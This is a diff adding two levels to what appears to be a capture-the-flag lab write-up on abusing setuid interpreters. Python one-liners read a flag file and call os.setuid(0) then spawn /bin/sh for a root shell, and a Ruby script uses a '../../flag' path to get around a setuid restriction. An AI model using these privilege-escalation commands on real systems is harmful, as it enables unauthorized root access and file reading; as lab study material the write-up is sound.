@@ -424,3 +424,26 @@ perl -ne print flag	#can read the flag
 #-e:can make the Perl program run in the terminal
 ```
 
+level 42: **python**
+
+```shell
+python -c print(open("flag").read()) #can read the flag
+
+python
+>>import os
+>>os.setuid(0)
+>>os.system("/bin/sh")	#getshell!!
+```
+
+level 43: **ruby**
+
+**Direct use of the command line will have a security warning, so it can only be written script execution file to read the flag.**
+
+```shell
+ruby -e 'puts File.read("flag")' #can't read the flag-->ruby: no -e allowed while running setuid (SecurityError)
+#use the scripts
+touch hack.rb #it have no permission in the / directory
+echo 'puts File.read("../../flag")' > hack.rb #'../../' is the critical!
+ruby hack.rb #can read the flag
+```
+
